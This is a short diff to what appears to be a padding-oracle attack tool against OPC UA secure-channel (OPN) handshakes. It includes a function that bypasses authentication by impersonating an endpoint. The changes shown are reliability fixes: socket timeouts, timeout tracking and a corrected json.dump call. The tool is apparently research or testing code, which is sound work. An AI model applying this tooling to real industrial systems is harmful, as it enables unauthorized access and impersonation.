@@ -518,6 +518,7 @@ class PaddingOracle(ABC):
   def __init__(self, endpoint : endpointDescription.Type):
     self._endpoint = endpoint
     self._active = False
+    self._has_timed_out = False
   
   @abstractmethod
   def _setup(self):
@@ -538,12 +539,15 @@ class PaddingOracle(ABC):
     ...
     
   def query(self, ciphertext : bytes):
-    if self._active:
+    if self._active and not self._has_timed_out:
       try:
         return self._attempt_query(ciphertext)
       except KeyboardInterrupt as ex:
         # Don't retry when user CTRL+C's.
         raise ex
+      except TimeoutError:
+        # Stop reusing connections once a timeout has happened once.
+        self._has_timed_out = True
       except:
         # On any misc. exception, assume the connection is broken and reset it.
         try:
@@ -567,6 +571,10 @@ class OPNPaddingOracle(PaddingOracle):
       receiverCertificateThumbprint=certificate_thumbprint(self._endpoint.serverCertificate),
       encodedPart=b''
     )
+    
+    # For some reason, one implementation leaves the TCP connection open after failure but stops responding. Put a
+    # timeout on the socket (kinda arbitrarily picked 3 seconds) to cause a breaking exception when this happens.
+    self._socket.settimeout(3)
     
   def _cleanup(self):
    self._socket.shutdown(SHUT_RDWR)
@@ -1123,7 +1131,7 @@ def bypass_opn(impersonate_endpoint : endpointDescription.Type, login_endpoint :
     log(f'Storing signed+encrypted OPN request in cache file {cache}.')
     cachedata[cachekey] = b64encode(opn_req.to_bytes())
     with cache.open('w') as outfile:
-      json.dump(outfile, cachedata)
+      json.dump(cachedata, outfile)
   
   log('Performing the OPN handshake...')
   login_sock = connect_and_hello(lhost, lport)
